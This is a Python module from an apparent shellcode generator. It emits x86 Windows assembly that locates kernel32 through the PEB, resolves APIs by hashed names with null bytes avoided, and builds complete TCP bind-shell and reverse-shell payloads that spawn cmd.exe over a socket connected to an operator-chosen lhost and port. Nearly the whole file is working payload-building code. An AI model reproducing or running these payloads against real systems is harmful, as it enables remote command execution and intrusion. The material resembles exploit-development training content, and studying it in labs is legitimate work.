"""
Assembly block builders and high-level mode builders.

Mode builders return (asm_string, SlotAllocator).  The asm_string can be
passed directly to shellcode.assemble() or printed with --show-asm.
"""

from .hashing   import compute_hash
from .encoding  import stack_string_pushes
from .slots     import SlotAllocator
from .snippets  import (
    SNIPPET_STARTUPINFOA_SOCKET,
    SNIPPET_CMD_STRING,
    snippet_createprocessa,
    snippet_terminateprocess,
    snippet_wsa_init,
    snippet_wsa_socket_tcp,
    snippet_sockaddr_bind,
    snippet_bind_listen_accept,
    snippet_wsaconnect,
)


# ── Static core blocks ─────────────────────────────────────────────────────────

_PROLOGUE = """\
start:
    mov   ebp, esp                   # stack frame base
    add   esp, 0xfffff9f9            # avoid null bytes (equiv: sub esp, 0x607)"""

_FIND_KERNEL32 = """\
find_kernel32:
    xor   ecx, ecx                   # ECX = 0
    mov   esi, fs:[ecx+30h]          # ESI = &PEB (FS:0x30)
    mov   esi, [esi+0Ch]             # ESI = PEB->Ldr
    mov   esi, [esi+1Ch]             # ESI = Ldr.InInitializationOrderModuleList
next_module:
    mov   ebx, [esi+8h]              # EBX = module base address
    mov   edi, [esi+20h]             # EDI = module name (unicode)
    mov   esi, [esi]                 # ESI = next entry (flink)
    cmp   [edi+12*2], cx             # modulename[12] == 0? (kernel32.dll = 12 chars)
    jne   next_module                # keep walking"""

_FIND_FUNCTION_THUNK = """\
find_function_shorten:
    jmp   find_function_shorten_bnc
find_function_ret:
    pop   esi                        # address of find_function
    mov   [ebp+0x04], esi            # save at reserved slot [ebp+0x04]
    jmp   resolve_symbols_kernel32
find_function_shorten_bnc:
    call  find_function_ret          # CALL pushes find_function address; negative offset"""


def _find_function_asm(algo: str, rotation: int) -> str:
    """Emit the find_function routine with the correct hash operation."""
    if algo == 'ror':
        hash_ops = (
            f'    ror   edx, {hex(rotation):<8}           # ROR-{rotation}\n'
            f'    add   edx, eax                   # accumulate byte'
        )
    else:
        hash_ops = (
            f'    rol   edx, {hex(rotation):<8}           # ROL-{rotation}\n'
            f'    xor   edx, eax                   # XOR byte in'
        )
    return (
        'find_function:\n'
        '    pushad\n'
        '    mov   eax, [ebx+0x3c]            # e_lfanew\n'
        '    mov   edi, [ebx+eax+0x78]        # Export Table RVA\n'
        '    add   edi, ebx                   # Export Table VMA\n'
        '    mov   ecx, [edi+0x18]            # NumberOfNames\n'
        '    mov   eax, [edi+0x20]            # AddressOfNames RVA\n'
        '    add   eax, ebx                   # AddressOfNames VMA\n'
        '    mov   [ebp-4], eax               # save for loop\n'
        'find_function_loop:\n'
        '    jecxz find_function_finished\n'
        '    dec   ecx\n'
        '    mov   eax, [ebp-4]\n'
        '    mov   esi, [eax+ecx*4]           # export name RVA\n'
        '    add   esi, ebx                   # export name VMA\n'
        'compute_hash:\n'
        '    xor   eax, eax\n'
        '    cdq\n'
        '    cld\n'
        'compute_hash_again:\n'
        '    lodsb\n'
        '    test  al, al\n'
        '    jz    compute_hash_finished\n'
        f'{hash_ops}\n'
        '    jmp   compute_hash_again\n'
        'compute_hash_finished:\n'
        'find_function_compare:\n'
        '    cmp   edx, [esp+0x24]            # compare with requested hash\n'
        '    jnz   find_function_loop\n'
        '    mov   edx, [edi+0x24]            # AddressOfNameOrdinals RVA\n'
        '    add   edx, ebx\n'
        '    mov   cx,  [edx+2*ecx]           # ordinal\n'
        '    mov   edx, [edi+0x1c]            # AddressOfFunctions RVA\n'
        '    add   edx, ebx\n'
        '    mov   eax, [edx+4*ecx]           # function RVA\n'
        '    add   eax, ebx                   # function VMA\n'
        '    mov   [esp+0x1c], eax            # overwrite pushad EAX slot\n'
        'find_function_finished:\n'
        '    popad\n'
        '    ret'
    )


# ── Resolve block builders ─────────────────────────────────────────────────────

def build_resolve_block(func_names: list, algo: str, rotation: int,
                        slots: SlotAllocator,
                        label: str = 'resolve_symbols_kernel32') -> str:
    """
    Emit push/call/mov triplets for each function name.
    EBX must equal the target DLL base on entry.
    Slots are allocated in *slots* and the SlotAllocator is updated in place.
    """
    lines = [f'{label}:']
    for name in func_names:
        h    = compute_hash(name, algo, rotation)
        slot = slots.alloc(name)
        lines += [
            f'    push  {hex(h):<14}           # {name}',
            f'    call  dword ptr [ebp+0x04]       # find_function',
            f'    mov   [ebp+{hex(slot)}], eax            # save {name}',
        ]
    return '\n'.join(lines)


def build_load_and_resolve(dll: str, func_names: list, algo: str,
                            rotation: int, slots: SlotAllocator) -> str:
    """
    Load *dll* via LoadLibraryA then resolve *func_names* from it.
    LoadLibraryA must already be allocated in *slots* before calling this.
    After this block, EBX = loaded DLL base.
    """
    tag       = dll.replace('.', '_').replace('-', '_')
    load_slot = slots.slot('LoadLibraryA')
    lines     = [f'load_{tag}:']
    for line in stack_string_pushes(dll):
        lines.append(f'    {line}')
    lines += [
        f'    push  esp                        # pointer to "{dll}"',
        f'    call  dword ptr [ebp+{hex(load_slot)}]   # LoadLibraryA("{dll}")',
        f'resolve_{tag}:',
        '    mov   ebx, eax                   # EBX = loaded DLL base',
    ]
    for name in func_names:
        h    = compute_hash(name, algo, rotation)
        slot = slots.alloc(name)
        lines += [
            f'    push  {hex(h):<14}           # {name}',
            '    call  dword ptr [ebp+0x04]       # find_function',
            f'    mov   [ebp+{hex(slot)}], eax            # save {name}',
        ]
    return '\n'.join(lines)


def build_call_placeholder(func_names: list, slots: SlotAllocator) -> str:
    """
    Emit a call_function placeholder listing all resolved slots.
    The first name in *func_names* becomes the default call target.
    """
    slot_comments = '\n'.join(
        f'    # [ebp+{hex(slots.slot(n))}] = {n}' for n in func_names
    )
    primary = func_names[0]
    return (
        'call_function:\n'
        f'{slot_comments}\n'
        '    # Push arguments for your chosen function above, then:\n'
        f'    call  dword ptr [ebp+{hex(slots.slot(primary))}]    # {primary}'
    )


# ── Mode builders ──────────────────────────────────────────────────────────────

def custom_code(func_names: list, algo: str = 'ror', rotation: int = 13):
    """
    Resolve *func_names* from kernel32 and emit a call_function placeholder.

    Returns (asm_string, SlotAllocator).
    """
    slots    = SlotAllocator()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(func_names, algo, rotation, slots),
        build_call_placeholder(func_names, slots),
    ]
    return '\n'.join(sections), slots


def bindshell_code(port: int, algo: str = 'ror', rotation: int = 13):
    """
    Full TCP bind shell on *port*.

    Assembly flow:
      prologue → find_kernel32 → find_function
      resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
      load + resolve ws2_32: WSAStartup, WSASocketA, bind, listen, accept
      WSAStartup → WSASocketA → sockaddr_in → bind → listen → accept
      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess

    Returns (asm_string, SlotAllocator).
    """
    slots    = SlotAllocator()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(
            ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA'],
            algo, rotation, slots),
        build_load_and_resolve(
            'ws2_32.dll',
            ['WSAStartup', 'WSASocketA', 'bind', 'listen', 'accept'],
            algo, rotation, slots),
        snippet_wsa_init(slots.slot('WSAStartup')),
        snippet_wsa_socket_tcp(slots.slot('WSASocketA')),
        snippet_sockaddr_bind(port),
        snippet_bind_listen_accept(
            slots.slot('bind'), slots.slot('listen'), slots.slot('accept')),
        SNIPPET_STARTUPINFOA_SOCKET,
        SNIPPET_CMD_STRING,
        snippet_createprocessa(slots.slot('CreateProcessA')),
        snippet_terminateprocess(slots.slot('TerminateProcess')),
    ]
    return '\n'.join(sections), slots


def revshell_code(lhost: str, lport: int, algo: str = 'ror', rotation: int = 13):
    """
    Full TCP reverse shell connecting to *lhost*:*lport*.

    Assembly flow:
      prologue → find_kernel32 → find_function
      resolve kernel32: TerminateProcess, LoadLibraryA, CreateProcessA
      load + resolve ws2_32: WSAStartup, WSASocketA, WSAConnect
      WSAStartup → WSASocketA → WSAConnect(lhost:lport)
      STARTUPINFOA (socket handles) → cmd.exe → CreateProcessA → TerminateProcess

    Returns (asm_string, SlotAllocator).
    """
    slots    = SlotAllocator()
    sections = [
        _PROLOGUE,
        _FIND_KERNEL32,
        _FIND_FUNCTION_THUNK,
        _find_function_asm(algo, rotation),
        build_resolve_block(
            ['TerminateProcess', 'LoadLibraryA', 'CreateProcessA'],
            algo, rotation, slots),
        build_load_and_resolve(
            'ws2_32.dll',
            ['WSAStartup', 'WSASocketA', 'WSAConnect'],
            algo, rotation, slots),
        snippet_wsa_init(slots.slot('WSAStartup')),
        snippet_wsa_socket_tcp(slots.slot('WSASocketA')),
        snippet_wsaconnect(lhost, lport, slots.slot('WSAConnect')),
        SNIPPET_STARTUPINFOA_SOCKET,
        SNIPPET_CMD_STRING,
        snippet_createprocessa(slots.slot('CreateProcessA')),
        snippet_terminateprocess(slots.slot('TerminateProcess')),
    ]
    return '\n'.join(sections), slots
